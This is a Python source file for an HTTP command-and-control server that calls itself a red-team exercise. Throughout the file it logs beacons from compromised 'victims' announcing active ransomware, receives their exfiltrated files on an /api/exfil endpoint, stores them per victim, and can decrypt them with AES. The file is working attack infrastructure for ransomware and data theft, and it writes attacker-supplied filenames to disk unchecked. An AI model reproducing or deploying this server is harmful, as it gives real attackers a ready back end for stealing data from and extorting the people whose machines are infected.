import json
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import os
import sys
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import unpad

os.environ['PYTHONIOENCODING'] = 'utf-8'

# ================== CONFIG ==================
class C2Config:
    def __init__(self):
        self.C2_HOST = '0.0.0.0'
        self.C2_PORT = 9443

        self.DATA_DIR = Path("c2_received_data")
        self.DATA_DIR.mkdir(exist_ok=True)
        
        self.EXFIL_DIR = self.DATA_DIR / "exfiltrated_files"
        self.EXFIL_DIR.mkdir(exist_ok=True)
        
        self.BEACON_LOG = self.DATA_DIR / "beacon_log.txt"
        self.RECEIVED_LOG = self.DATA_DIR / "received_files_log.txt"
        self.LOG_FILE = self.DATA_DIR / "c2_server.log"

CONFIG = C2Config()

# ================== LOGGING TO FILE AND CONSOLE ==================
class DualLogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.terminal = sys.stdout

    def write(self, message):
        self.terminal.write(message)
        self.terminal.flush()
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(message)
        except:
            pass

    def flush(self):
        pass

sys.stdout = DualLogger(CONFIG.LOG_FILE)

# ================== DECRYPTION FUNCTION ==================
def decrypt_file(file_path: Path, password: str):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()

        # Assuming first 16 bytes are IV
        iv = data[:16]
        ciphertext = data[16:]
        
        # Use a fixed salt or derive from victim ID or other known value
        salt = b'some_fixed_salt'  # Must match victim's salt
        
        key = PBKDF2(password, salt, dkLen=32, count=100000)
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        
        # Save decrypted file alongside original with .dec extension
        dec_path = file_path.with_suffix(file_path.suffix + '.dec')
        with open(dec_path, 'wb') as f:
            f.write(plaintext)
        
        print(f"[+] Decrypted file saved to: {dec_path}")
        return True
    except Exception as e:
        print(f"[ERROR] Decryption failed for {file_path}: {e}")
        return False

# ================== C2 SERVER HANDLER ==================
class SimpleC2Handler(BaseHTTPRequestHandler):

    def do_POST(self):
        """Handle POST requests from victims"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            
            path = self.path
            
            if path == '/api/beacon':
                self.handle_beacon(body)
            elif path == '/api/exfil':
                self.handle_exfil(body)
            else:
                self.send_response(404)
                self.end_headers()
        
        except Exception as e:
            print(f"[ERROR] Error: {e}")
            try:
                self.send_response(500)
                self.end_headers()
            except:
                pass

    def handle_beacon(self, body):
        """Handle beacon/heartbeat from victim"""
        try:
            data = json.loads(body.decode('utf-8'))
            victim_id = data.get('victim_id', 'unknown')
            hostname = data.get('hostname', 'unknown')
            username = data.get('username', 'unknown')
            timestamp = data.get('timestamp', datetime.now().isoformat())
            
            beacon_message = f"""
{'='*70} [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [BEACON RECEIVED] {'='*70}
Victim ID .........: {victim_id}
Hostname ..........: {hostname}
Username ..........: {username}
Beacon Time .......: {timestamp}
Message ...........: System compromised - Ransomware active
Status ............: INFECTION SUCCESSFUL
{'='*70}
"""

            print(beacon_message)
            
            # Log to beacon file
            try:
                with open(CONFIG.BEACON_LOG, 'a', encoding='utf-8') as f:
                    f.write(beacon_message + '\n')
            except:
                pass

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
        
        except json.JSONDecodeError:
            print(f"[ERROR] Invalid JSON in beacon")
            try:
                self.send_response(400)
                self.end_headers()
            except:
                pass
        except Exception as e:
            print(f"[ERROR] Beacon error: {e}")
            try:
                self.send_response(400)
                self.end_headers()
            except:
                pass

    def handle_exfil(self, body):
        """Handle exfiltrated file"""
        try:
            # Get victim ID from header
            victim_id = self.headers.get('X-Victim-ID', 'unknown')
            
            # Get metadata from header
            metadata_str = self.headers.get('X-Metadata', '{}')
            try:
                metadata = json.loads(metadata_str)
            except:
                metadata = {}
            
            filename = metadata.get('filename', 'unknown_file')
            
            # Create victim folder
            victim_folder = CONFIG.EXFIL_DIR / victim_id
            victim_folder.mkdir(exist_ok=True)
            
            # Save file
            file_path = victim_folder / filename
            with open(file_path, 'wb') as f:
                f.write(body)
            
            print(f"[+] Extracted file saved to: {file_path}")
            
            # Optional decryption (uncomment and set password when needed)
            # shared_password = "your_shared_password_here"
            # decrypt_file(file_path, shared_password)
            
            size_bytes = len(body)
            size_kb = size_bytes / 1024
            size_mb = size_bytes / (1024 * 1024)
            
            exfil_message = f"""
{'='*70} [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [FILE EXFILTRATED] {'='*70}
Filename .........: {filename}
File Size ........: {size_bytes:,} bytes ({size_kb:.2f} KB / {size_mb:.4f} MB)
Victim ID ........: {victim_id}
Saved Location ...: {file_path}
Status ...........: SUCCESSFULLY RECEIVED
{'='*70}
"""

            print(exfil_message)
            
            # Log to received files log
            try:
                with open(CONFIG.RECEIVED_LOG, 'a', encoding='utf-8') as f:
                    f.write(exfil_message + '\n')
            except:
                pass

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'received'}).encode())
        
        except Exception as e:
            print(f"[ERROR] Exfil error: {e}")
            try:
                self.send_response(400)
                self.end_headers()
            except:
                pass

    def log_message(self, format, *args):
        """Suppress default HTTP logging"""
        pass

# ================== MAIN ==================
def main():
    print("""╔════════════════════════════════════════════════════════════════════╗
║                    C2 SERVER - RED TEAM EXERCISE                   ║
║              Receives Exfiltrated Files & Beacons                  ║
╚════════════════════════════════════════════════════════════════════╝""")

    print("=" * 70)
    print(f"[+] C2 Server initialized")
    print(f"[+] Listening on: 0.0.0.0:{CONFIG.C2_PORT}")
    print(f"[+] Exfiltrated files saved to: {CONFIG.EXFIL_DIR}")
    print(f"[+] Beacon log: {CONFIG.BEACON_LOG}")
    print(f"[+] Files log: {CONFIG.RECEIVED_LOG}")
    print(f"[+] Server log: {CONFIG.LOG_FILE}")
    print(f"[+] Waiting for victim connections...")
    print("=" * 70)
    print()

    server = HTTPServer((CONFIG.C2_HOST, CONFIG.C2_PORT), SimpleC2Handler)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n" + "="*70)
        print("[+] C2 Server shutting down...")
        print("="*70)
    except Exception as e:
        print(f"[ERROR] Server error: {e}")

if __name__ == "__main__":
    main()